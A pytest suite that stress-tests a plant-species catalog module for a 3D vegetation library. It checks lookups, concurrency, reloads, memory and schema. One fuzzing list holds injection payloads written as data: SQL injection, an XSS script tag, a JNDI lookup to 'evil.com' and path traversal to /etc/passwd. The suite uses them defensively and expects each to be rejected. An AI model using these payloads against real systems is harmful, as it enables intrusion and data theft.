"""
Adversarial Empirical Challenge and Stress-Testing Suite for Milestone 1
Botanical Taxonomy & Catalog Specification (MorphoMesh Vegetation Library)

Author: Challenger 1 (.agents/m1_challenger_1)
Target: teamwork_projects/vegetation_library/vegetation_pipeline/catalog.py
        teamwork_projects/vegetation_library/vegetation_pipeline/taxonomy_catalog.json
"""
import concurrent.futures
import gc
import json
import os
import sys
import tempfile
import threading
import time
import tracemalloc
from pathlib import Path
from typing import Any, Dict, List, Tuple

# Ensure repository root is on sys.path
REPO_ROOT = Path(__file__).resolve().parents[2]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

# Also ensure vegetation_library is on sys.path
VEG_LIB_DIR = REPO_ROOT / "teamwork_projects" / "vegetation_library"
if str(VEG_LIB_DIR) not in sys.path:
    sys.path.insert(0, str(VEG_LIB_DIR))

import pytest
from pydantic import ValidationError

from vegetation_pipeline.catalog import (
    CATEGORY_ALIASES,
    DEFAULT_CATALOG_JSON,
    UNIVERSAL_NEGATIVE_BLACKLIST,
    BotanicalCategory,
    DimensionsSpec,
    MeshyPromptSpec,
    MorphologySpec,
    PlantSpecies,
    VegetationLibraryCatalog,
    VerificationCriteria,
    get_catalog,
    get_species,
    get_species_by_category,
    list_categories,
    list_species,
    list_species_ids,
    load_catalog,
)


class TestAdversarialFuzzingAndMalformedInputs:
    """Suite 1: Adversarial fuzzing, malformed queries, and extreme input resilience."""

    MALFORMED_NON_STRINGS = [
        None,
        123,
        0,
        -1,
        3.14159,
        True,
        False,
        [],
        [1, 2, 3],
        {},
        {"species_id": "veg_tree_oak_01"},
        set(),
        object(),
    ]

    EXTREME_STRINGS = [
        "",
        " ",
        "   ",
        "\t",
        "\n",
        "\r\n",
        "\v\f",
        " " * 1000,
        "a" * 10000,
        "!@#$%^&*()_+-=[]{}|;':\",.<>?/`~",
        "' OR '1'='1",
        "'; DROP TABLE species; --",
        "<script>alert('xss')</script>",
        "{{7*7}}",
        "${jndi:ldap://evil.com/x}",
        "%(species)s",
        "{self.__class__.__name__}",
        "\x00",
        "veg_\x00_oak",
        "../../../../etc/passwd",
        "C:\\Windows\\System32\\calc.exe",
    ]

    UNICODE_EDGE_CASES = [
        "🌳",
        "🌲",
        "🌴",
        "🌵",
        "🌸",
        "Quercus rôbur",
        "Pinus sylvéstris",
        "Müsa acuminata",
        "дуб черешчатый",
        "δρυς",
        "橡树",
        "شجرة بلوط",
        "עץ אלון",
        "Ｑｕｅｒｃｕｓ　ｒｏｂｕｒ",
        "\u200bQuercus robur",
        "Quercus\u200crobur",
        "Quercus\u00a0robur",
        "English\u202fOak",
    ]

    def test_non_string_inputs_to_get_species(self):
        """Verify get_species handles non-string inputs safely without crashing global state."""
        for val in self.MALFORMED_NON_STRINGS:
            # Non-string input should raise AttributeError or TypeError, not silently return wrong object
            with pytest.raises((AttributeError, TypeError, KeyError)):
                get_species(val)  # type: ignore

        # Critical: Verify global catalog state remains uncorrupted after malformed queries
        oak = get_species("veg_tree_oak_01")
        assert oak.species_id == "veg_tree_oak_01"
        assert oak.common_name == "English Oak"

    def test_extreme_and_injection_strings_to_get_species(self):
        """Verify extreme strings, SQLi, and path traversal strings raise KeyError cleanly."""
        for s in self.EXTREME_STRINGS:
            with pytest.raises(KeyError) as exc_info:
                get_species(s)
            # Invariant: Error message must not disclose unhandled internal trace
            assert "not found in catalog" in str(exc_info.value)

        # Invariant check
        pine = get_species("veg_conifer_pine_01")
        assert pine.species_id == "veg_conifer_pine_01"

    def test_unicode_and_diacritic_handling_in_get_species(self):
        """Verify unicode strings, emojis, and unnormalized accents behave predictably."""
        for s in self.UNICODE_EDGE_CASES:
            # Unnormalized accents or emojis not present in the catalog should raise KeyError
            with pytest.raises(KeyError):
                get_species(s)

        # Invariant check
        maple = get_species("veg_tree_maple_01")
        assert maple.species_id == "veg_tree_maple_01"

    def test_malformed_inputs_to_get_species_by_category(self):
        """Verify get_species_by_category rejects malformed and non-existent categories."""
        for val in self.MALFORMED_NON_STRINGS:
            with pytest.raises((AttributeError, TypeError, KeyError)):
                get_species_by_category(val)  # type: ignore

        invalid_categories = [
            "",
            "   ",
            "\t",
            "nonexistent_category",
            "broadleaf-trees",  # Hyphenated instead of underscored
            "alien_flora",
            "x" * 500,
        ]
        for cat in invalid_categories:
            with pytest.raises(KeyError):
                get_species_by_category(cat)

        # Invariant: canonical category queries still work
        broadleaf = get_species_by_category("broadleaf_trees")
        assert len(broadleaf) == 5


class TestAdversarialLookupMatrixAndNormalization:
    """Suite 2: Exhaustive 14-point lookup permutation matrix for all 35 species."""

    def test_all_species_exhaustive_lookup_matrix(self):
        """
        For every one of the 35 species, test:
        1. Exact species_id
        2. UPPERCASE species_id
        3. Mixed-case species_id
        4. species_id with leading/trailing whitespace
        5. Exact scientific name
        6. UPPERCASE scientific name
        7. lowercase scientific name
        8. scientific slug (underscores)
        9. UPPERCASE scientific slug
        10. Exact common name
        11. lowercase common name
        12. UPPERCASE common name
        13. common name slug (underscores)
        14. common name with leading/trailing whitespace
        Total assertions: 35 species * 14 lookups = 490 lookups.
        """
        catalog = get_catalog()
        assert len(catalog.species) == 35

        for sp in catalog.species:
            sid = sp.species_id
            sname = sp.scientific_name
            cname = sp.common_name

            lookups = [
                sid,
                sid.upper(),
                sid.title(),
                f"  {sid}  \t",
                sname,
                sname.upper(),
                sname.lower(),
                sp.scientific_slug,
                sp.scientific_slug.upper(),
                cname,
                cname.lower(),
                cname.upper(),
                cname.lower().replace(" ", "_"),
                f" \n {cname} \t ",
            ]

            for query in lookups:
                res = get_species(query)
                assert res.species_id == sid, (
                    f"Query '{query}' returned wrong species '{res.species_id}', expected '{sid}'"
                )
                assert res.scientific_name == sname
                assert res.common_name == cname

    def test_category_lookup_matrix_and_aliases(self):
        """Verify all canonical categories and aliases are case- and whitespace-tolerant."""
        canonical_categories = list_categories()
        assert len(canonical_categories) == 7

        for cat in canonical_categories:
            # Test case and whitespace tolerance
            assert len(get_species_by_category(cat.upper())) == 5
            assert len(get_species_by_category(f"  {cat} \t")) == 5
            assert len(get_species_by_category(cat.title())) == 5

        for alias, canonical in CATEGORY_ALIASES.items():
            res_alias = get_species_by_category(alias)
            res_canonical = get_species_by_category(canonical)
            assert len(res_alias) == 5
            assert [s.species_id for s in res_alias] == [s.species_id for s in res_canonical]
            # Case and whitespace tolerance on aliases
            assert len(get_species_by_category(alias.upper())) == 5
            assert len(get_species_by_category(f"  {alias}  ")) == 5

    def test_catalog_getitem_and_contains_semantics(self):
        """Verify catalog __getitem__ and explore container behavior."""
        catalog = get_catalog()

        # Dictionary-style lookup via __getitem__
        assert catalog["veg_tree_oak_01"].common_name == "English Oak"
        assert catalog["Quercus robur"].species_id == "veg_tree_oak_01"
        assert catalog["English Oak"].species_id == "veg_tree_oak_01"

        with pytest.raises(KeyError):
            _ = catalog["nonexistent_id"]


class TestPropertyMutabilityAndStatePollution:
    """Suite 3: Stress-test property mutability, singleton isolation, and cache recovery."""

    def test_mutating_returned_species_affects_cache_and_reload_restores_it(self):
        """
        Verify the consequence of Pydantic model mutability (frozen=False):
        When a caller mutates an attribute on a retrieved species, it mutates
        the shared in-memory instance. Verify that get_catalog(reload=True)
        completely purges mutated objects and restores the pristine state.
        """
        # 1. Fetch species
        sp = get_species("veg_tree_oak_01")
        original_height = sp.dimensions.height_m
        original_common = sp.common_name
        assert original_height == 12.0
        assert original_common == "English Oak"

        # 2. Mutate in-place
        sp.dimensions.height_m = 999.9
        sp.common_name = "Corrupted Mutant Oak"

        # 3. Observe shared reference impact
        sp2 = get_species("veg_tree_oak_01")
        assert sp2.dimensions.height_m == 999.9
        assert sp2.common_name == "Corrupted Mutant Oak"

        # 4. Perform catalog reload to restore pristine state
        restored_catalog = get_catalog(reload=True)
        sp_restored = get_species("veg_tree_oak_01")
        assert sp_restored.dimensions.height_m == original_height
        assert sp_restored.common_name == original_common
        assert len(restored_catalog) == 35

    def test_corrupting_internal_catalog_lists_and_reloading(self):
        """Verify that wiping or corrupting catalog.species can be cleanly healed with reload=True."""
        catalog = get_catalog()
        # Maliciously clear the species list
        saved_species = list(catalog.species)
        catalog.species.clear()
        assert len(catalog.species) == 0

        # Reload must fully heal the singleton
        healed_catalog = get_catalog(reload=True)
        assert len(healed_catalog.species) == 35
        assert len(get_catalog()) == 35


class TestCorruptedCatalogFilesAndFailedReloads:
    """Suite 4: Corrupt JSON files, missing keys, invalid types, and cache preservation."""

    def test_nonexistent_file_does_not_corrupt_cache(self):
        """Verify attempting to reload from a non-existent file leaves cached catalog intact."""
        cat_before = get_catalog()
        assert len(cat_before) == 35

        with pytest.raises(FileNotFoundError):
            get_catalog(reload=True, json_path="C:\\nonexistent\\path\\fake_catalog.json")

        # Cache must remain valid
        cat_after = get_catalog()
        assert len(cat_after) == 35
        assert get_species("veg_tree_oak_01").common_name == "English Oak"

    def test_syntactically_invalid_json_leaves_cache_intact(self):
        """Verify syntax errors in JSON do not corrupt memory cache."""
        with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False, encoding="utf-8") as tmp:
            tmp.write("{\n  \"broken_json\": [true, false,\n")
            tmp_path = tmp.name

        try:
            with pytest.raises(json.JSONDecodeError):
                load_catalog(tmp_path)

            with pytest.raises(json.JSONDecodeError):
                get_catalog(reload=True, json_path=tmp_path)

            # Invariant: existing catalog still works
            assert len(get_catalog()) == 35
            assert get_species("veg_tree_oak_01").species_id == "veg_tree_oak_01"
        finally:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

    def test_schema_invalid_json_leaves_cache_intact(self):
        """Verify semantic schema violations in JSON do not corrupt memory cache."""
        # Create a catalog with negative height
        valid_data = json.loads(DEFAULT_CATALOG_JSON.read_text(encoding="utf-8"))
        valid_data["species"][0]["dimensions"]["height_m"] = -99.0

        with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False, encoding="utf-8") as tmp:
            json.dump(valid_data, tmp)
            tmp_path = tmp.name

        try:
            with pytest.raises(ValidationError):
                load_catalog(tmp_path)

            with pytest.raises(ValidationError):
                get_catalog(reload=True, json_path=tmp_path)

            # Invariant: existing catalog still works
            assert len(get_catalog()) == 35
            assert get_species("veg_tree_oak_01").dimensions.height_m == 12.0
        finally:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)


class TestConcurrencyAndThreadSafety:
    """Suite 5: Multi-threaded query stress and concurrent reload race condition testing."""

    def test_high_concurrency_mixed_queries(self):
        """
        Execute 10,000 queries across 20 concurrent threads.
        Assert 0 exceptions, 0 race-condition corruptions, and 100% correct query results.
        """
        num_threads = 20
        queries_per_thread = 500
        errors: List[str] = []

        # Get fresh catalog
        get_catalog(reload=True)

        species_ids = list_species_ids()
        categories = list_categories()
        aliases = list(CATEGORY_ALIASES.keys())

        def worker(thread_idx: int):
            for i in range(queries_per_thread):
                try:
                    # Alternating query types
                    q_type = i % 5
                    if q_type == 0:
                        sid = species_ids[i % len(species_ids)]
                        sp = get_species(sid)
                        if sp.species_id != sid:
                            errors.append(f"T{thread_idx}: Mismatched species {sp.species_id} != {sid}")
                    elif q_type == 1:
                        cat = categories[i % len(categories)]
                        sp_list = get_species_by_category(cat)
                        if len(sp_list) != 5:
                            errors.append(f"T{thread_idx}: Category {cat} returned {len(sp_list)} species")
                    elif q_type == 2:
                        alias = aliases[i % len(aliases)]
                        sp_list = get_species_by_category(alias)
                        if len(sp_list) != 5:
                            errors.append(f"T{thread_idx}: Alias {alias} returned {len(sp_list)} species")
                    elif q_type == 3:
                        all_ids = list_species_ids()
                        if len(all_ids) != 35:
                            errors.append(f"T{thread_idx}: list_species_ids returned {len(all_ids)}")
                    elif q_type == 4:
                        all_cats = list_categories()
                        if len(all_cats) != 7:
                            errors.append(f"T{thread_idx}: list_categories returned {len(all_cats)}")
                except Exception as e:
                    errors.append(f"T{thread_idx} query {i} failed with {type(e).__name__}: {e}")

        threads = [threading.Thread(target=worker, args=(t,)) for t in range(num_threads)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert not errors, f"Encountered {len(errors)} errors during concurrency test:\n" + "\n".join(errors[:10])

    def test_concurrent_reads_during_catalog_reload(self):
        """
        Stress test: Readers actively query the catalog while a background thread
        repeatedly calls get_catalog(reload=True).
        Detects if index dictionary reassignment causes intermittent KeyErrors or partial states.
        """
        stop_event = threading.Event()
        read_errors: List[str] = []
        reload_errors: List[str] = []
        read_count = [0]
        reload_count = [0]

        def reloader():
            while not stop_event.is_set():
                try:
                    get_catalog(reload=True)
                    reload_count[0] += 1
                    time.sleep(0.005)
                except Exception as e:
                    reload_errors.append(f"Reload failed: {type(e).__name__}: {e}")

        def reader(reader_id: int):
            while not stop_event.is_set():
                try:
                    sp = get_species("veg_tree_oak_01")
                    if sp.common_name != "English Oak":
                        read_errors.append(f"Reader {reader_id} saw inconsistent common_name {sp.common_name}")
                    sp2 = get_species("Quercus robur")
                    if sp2.species_id != "veg_tree_oak_01":
                        read_errors.append(f"Reader {reader_id} saw inconsistent species_id {sp2.species_id}")
                    read_count[0] += 1
                except Exception as e:
                    read_errors.append(f"Reader {reader_id} failed: {type(e).__name__}: {e}")

        # Start 1 reloader and 6 readers
        t_reloader = threading.Thread(target=reloader)
        t_readers = [threading.Thread(target=reader, args=(i,)) for i in range(6)]

        t_reloader.start()
        for tr in t_readers:
            tr.start()

        # Run stress period for 1.5 seconds
        time.sleep(1.5)
        stop_event.set()

        t_reloader.join()
        for tr in t_readers:
            tr.join()

        assert not reload_errors, f"Reload errors: {reload_errors[:5]}"
        assert not read_errors, f"Read errors during concurrent reload: {read_errors[:5]}"
        assert reload_count[0] > 10, f"Expected >10 reloads, performed {reload_count[0]}"
        assert read_count[0] > 1000, f"Expected >1000 reads, performed {read_count[0]}"


class TestMemoryAndResourceLeakStability:
    """Suite 6: Memory stability and object leak profiling over repeated reloads."""

    def test_repeated_reload_memory_stability(self):
        """
        Reload catalog 100 times and monitor memory via tracemalloc.
        Assert that memory growth does not continually diverge (memory leak).
        """
        gc.collect()
        tracemalloc.start()

        # Warmup
        get_catalog(reload=True)
        gc.collect()
        snapshot_start = tracemalloc.take_snapshot()

        # 100 repeated reloads
        for _ in range(100):
            get_catalog(reload=True)

        gc.collect()
        snapshot_end = tracemalloc.take_snapshot()
        tracemalloc.stop()

        top_stats = snapshot_end.compare_to(snapshot_start, "lineno")
        total_growth_bytes = sum(stat.size_diff for stat in top_stats if stat.size_diff > 0)

        # 100 reloads should not leak more than 500 KB net memory after GC
        assert total_growth_bytes < 500 * 1024, (
            f"Excessive memory growth detected over 100 reloads: {total_growth_bytes / 1024:.2f} KB"
        )


class TestFullBotanicalCatalogTaxonomyAndBiomeAudit:
    """Suite 7: Forensic audit of all 35 species for botanical realism and contract compliance."""

    def test_complete_56_token_negative_blacklist_across_all_species(self):
        """
        Adversarially verify that EVERY SINGLE SPECIES contains the full 61-token
        universal negative blacklist (which exceeds the >= 56 token requirement)
        without truncation or omission.
        """
        catalog = get_catalog(reload=True)
        expected_tokens = [tok.strip().lower() for tok in UNIVERSAL_NEGATIVE_BLACKLIST.split(",")]
        assert len(expected_tokens) == 61, f"Expected 61 tokens in UNIVERSAL_NEGATIVE_BLACKLIST, got {len(expected_tokens)}"

        for sp in catalog.species:
            neg = sp.meshy_spec.negative_prompt.lower()
            missing = [tok for tok in expected_tokens if tok not in neg]
            assert not missing, f"Species '{sp.species_id}' missing {len(missing)} negative tokens: {missing}"
            assert sp.meshy_spec.negative_prompt == UNIVERSAL_NEGATIVE_BLACKLIST

    def test_grounding_anchors_in_all_species_prompts(self):
        """
        Adversarially verify that:
        1. The 6 designated species (Willow, Beech, Spruce, Cypress, Moss, Spanish Moss)
           explicitly contain the enhanced grounding phrases from Explorer 2 / Worker 1.
        2. All 35 species contain 'standalone' and 'single' cues.
        3. All 35 species contain ground / substrate / base morphology cues.
        """
        catalog = get_catalog()

        # 1. Check 6 designated species
        designated_anchors = {
            "veg_tree_willow_01": "growing naturally from ground base",
            "veg_tree_beech_01": "growing naturally from ground base",
            "veg_conifer_spruce_01": "rooted naturally at ground base",
            "veg_conifer_cypress_01": "growing naturally from ground base",
            "veg_ground_moss_01": "resting naturally on forest ground base",
            "veg_epiphyte_spanishmoss_01": "rooted at ground base with vertical self-supporting form",
        }
        for sid, anchor in designated_anchors.items():
            prompt = get_species(sid).meshy_spec.positive_prompt.lower()
            assert anchor in prompt, f"Designated anchor '{anchor}' missing in {sid}: {prompt}"

        # 2. Check all 35 species for standalone + substrate cues
        for sp in catalog.species:
            prompt = sp.meshy_spec.positive_prompt.lower()
            assert "standalone" in prompt, f"Missing 'standalone' in {sp.species_id}"
            assert "single" in prompt, f"Missing 'single' in {sp.species_id}"

            has_substrate_or_base = any(
                term in prompt
                for term in ["ground", "rooted", "base", "gravel", "trunk", "stem", "cluster"]
            )
            assert has_substrate_or_base, (
                f"Species '{sp.species_id}' missing substrate or base morphology anchor: {prompt}"
            )

    def test_botanical_dimensions_physically_consistent_across_all_categories(self):
        """
        Audit physical dimension plausibility for all 7 botanical categories:
        - Trees: Height >= 4.0m, Canopy >= 2.0m, Trunk >= 0.1m
        - Shrubs: Height 0.3m–4.0m, Canopy 0.4m–3.5m
        - Conifers: Height >= 5.0m, Canopy >= 1.0m, Trunk >= 0.15m
        - Groundcover: Height 0.05m–3.5m
        - Succulents: Height 0.1m–15.0m
        - Tropical: Height 0.8m–15.0m
        - Vines: Height 1.0m–25.0m
        """
        catalog = get_catalog()
        for sp in catalog.species:
            dim = sp.dimensions
            cat = sp.category_id

            if cat == "broadleaf_deciduous_trees":
                assert dim.height_m >= 4.0, f"Broadleaf tree {sp.species_id} height {dim.height_m}m < 4.0m"
                assert dim.canopy_spread_m >= 2.0
                assert dim.trunk_stem_diameter_m >= 0.10
            elif cat == "conifers_evergreens":
                assert dim.height_m >= 5.0, f"Conifer {sp.species_id} height {dim.height_m}m < 5.0m"
                assert dim.canopy_spread_m >= 1.0
                assert dim.trunk_stem_diameter_m >= 0.15
            elif cat == "flowering_shrubs_ornamentals":
                assert 0.3 <= dim.height_m <= 5.0, f"Shrub {sp.species_id} height {dim.height_m}m out of bounds"
                assert 0.3 <= dim.canopy_spread_m <= 4.0
            elif cat == "succulents_cacti":
                assert 0.1 <= dim.height_m <= 15.0
            elif cat == "ferns_grasses_groundcover":
                assert 0.05 <= dim.height_m <= 4.0
            elif cat == "climbing_vines_epiphytes":
                assert 1.0 <= dim.height_m <= 25.0

    def test_pbr_and_static_mesh_invariants_across_all_species(self):
        """Verify strict unrigged static mesh and 4-channel PBR requirements across all 35 species."""
        catalog = get_catalog()
        for sp in catalog.species:
            crit = sp.verification
            assert crit.enforce_zero_armature is True
            assert crit.enforce_root_pivot is True
            assert crit.min_vertices >= 3000
            assert crit.max_vertices <= 45000
            assert set(crit.required_pbr_maps) == {"baseColor", "normal", "roughness", "metallic"}
            assert sp.meshy_spec.enable_pbr is True
            assert sp.meshy_spec.ai_model == "meshy-4"
            assert sp.meshy_spec.art_style == "realistic"


class TestCatalogContainerBehavioralDefectsAndEdgeCases:
    """Suite 8: Empirical verification of container interface edge cases and behavioral surprises."""

    def test_membership_in_operator_returns_false_for_valid_species_id(self):
        """
        EMPERICAL DEFECT OBSERVATION:
        VegetationLibraryCatalog implements __iter__ (which yields PlantSpecies) and
        __getitem__ (which takes str identifier), but does NOT implement __contains__.
        As a result, `'veg_tree_oak_01' in catalog` evaluates to False because Python
        compares string against PlantSpecies instances.
        Conversely, `get_species('veg_tree_oak_01') in catalog` evaluates to True.
        This test documents this container trap for downstream developers.
        """
        catalog = get_catalog()
        # This returns False because __contains__ is not implemented for str IDs:
        assert ("veg_tree_oak_01" in catalog) is False

        # This returns True because __iter__ yields matching PlantSpecies object:
        assert (get_species("veg_tree_oak_01") in catalog) is True

    def test_integer_indexing_raises_attribute_error_not_index_error(self):
        """
        EMPERICAL DEFECT OBSERVATION:
        Because catalog defines __len__, developers might assume sequence indexing:
        `catalog[0]`. However, __getitem__ forwards to `get_species(0)`, which executes
        `0.strip()`, raising AttributeError instead of IndexError or KeyError.
        """
        catalog = get_catalog()
        with pytest.raises(AttributeError, match="has no attribute 'strip'"):
            _ = catalog[0]  # type: ignore

    def test_non_string_query_raises_attribute_error_not_type_error(self):
        """
        get_species does not guard `if not isinstance(identifier, str): raise TypeError(...)`.
        Consequently, passing None or int raises AttributeError ('strip').
        """
        with pytest.raises(AttributeError):
            get_species(None)  # type: ignore

        with pytest.raises(AttributeError):
            get_species_by_category(None)  # type: ignore


class TestRandomizedQueryFuzzer:
    """Suite 9: Pseudo-random adversarial query generator."""

    def test_1000_random_fuzzed_queries_handled_safely(self):
        """
        Generate 1,000 pseudo-random strings of variable lengths, encodings, and symbols.
        Verify that none crash Python, cause memory faults, or corrupt the catalog cache.
        """
        import random
        import string

        random.seed(42)
        catalog = get_catalog()
        valid_ids = set(list_species_ids())
        valid_scis = {s.scientific_slug for s in catalog.species}
        valid_coms = {s.common_name.lower() for s in catalog.species}

        char_pool = string.printable + "àáâãäåæçèéêëìíîïñòóôõöøùúûüýÿ" + "🌳🌲🌴🌵" + "\x00\t\n\r"

        for _ in range(1000):
            length = random.randint(0, 100)
            fuzzed_str = "".join(random.choice(char_pool) for _ in range(length))

            try:
                res = get_species(fuzzed_str)
                # If it didn't raise, verify it actually matched a valid identifier
                key = fuzzed_str.strip().lower()
                assert (
                    key in valid_ids
                    or key.replace(" ", "_") in valid_scis
                    or key in valid_coms
                    or key.replace(" ", "_") in valid_coms
                ), f"Fuzzed string '{fuzzed_str}' matched unexpected species {res.species_id}"
            except (KeyError, AttributeError):
                # Expected safe rejection
                pass

        # Post-fuzzing cache integrity check
        assert get_species("veg_tree_oak_01").common_name == "English Oak"
        assert len(get_catalog()) == 35


class TestRawJsonSchemaIntegrityAndPerformance:
    """Suite 10: Deep schema audit directly on raw taxonomy_catalog.json and performance benchmark."""

    def test_raw_json_file_structural_conformance(self):
        """Audit the raw JSON text directly, bypassing Pydantic deserialization."""
        raw_text = DEFAULT_CATALOG_JSON.read_text(encoding="utf-8")
        data = json.loads(raw_text)

        assert data["schema_version"] == "1.0.0"
        assert data["project"] == "MorphoMesh Vegetation Library"
        assert data["total_species"] == 35
        assert data["total_categories"] == 7
        assert len(data["categories"]) == 7
        assert len(data["species"]) == 35

        for s in data["species"]:
            assert "species_id" in s
            assert "common_name" in s
            assert "scientific_name" in s
            assert "family" in s
            assert "category_id" in s
            assert "dimensions" in s
            assert "morphology" in s
            assert "meshy_spec" in s
            assert "verification" in s

            dims = s["dimensions"]
            assert dims["height_m"] > 0
            assert len(dims["height_range_m"]) == 2
            assert dims["height_range_m"][0] <= dims["height_range_m"][1]
            assert dims["canopy_spread_m"] > 0
            assert dims["trunk_stem_diameter_m"] > 0

            morph = s["morphology"]
            assert morph["foliage_density"] in ["dense", "medium", "airy", "compact", "open"]

            meshy = s["meshy_spec"]
            assert meshy["ai_model"] == "meshy-4"
            assert meshy["art_style"] == "realistic"
            assert meshy["topology"] in ["quad", "triangle"]
            assert 10000 <= meshy["target_polycount"] <= 45000
            assert meshy["enable_pbr"] is True

            verif = s["verification"]
            assert verif["min_vertices"] >= 3000
            assert verif["max_vertices"] <= 45000
            assert verif["enforce_zero_armature"] is True
            assert verif["enforce_root_pivot"] is True
            assert set(verif["required_pbr_maps"]) == {"baseColor", "normal", "roughness", "metallic"}

    def test_query_throughput_benchmark(self):
        """Assert that get_species lookup throughput exceeds 50,000 queries/sec (O(1) memory index)."""
        get_catalog(reload=True)
        species_ids = list_species_ids()

        iterations = 50000
        start_time = time.perf_counter()
        for i in range(iterations):
            _ = get_species(species_ids[i % 35])
        elapsed = time.perf_counter() - start_time

        qps = iterations / elapsed
        # Must exceed 50,000 queries per second
        assert qps > 50000, f"Query throughput too slow: {qps:.0f} QPS"


if __name__ == "__main__":
    pytest.main(["-v", __file__])
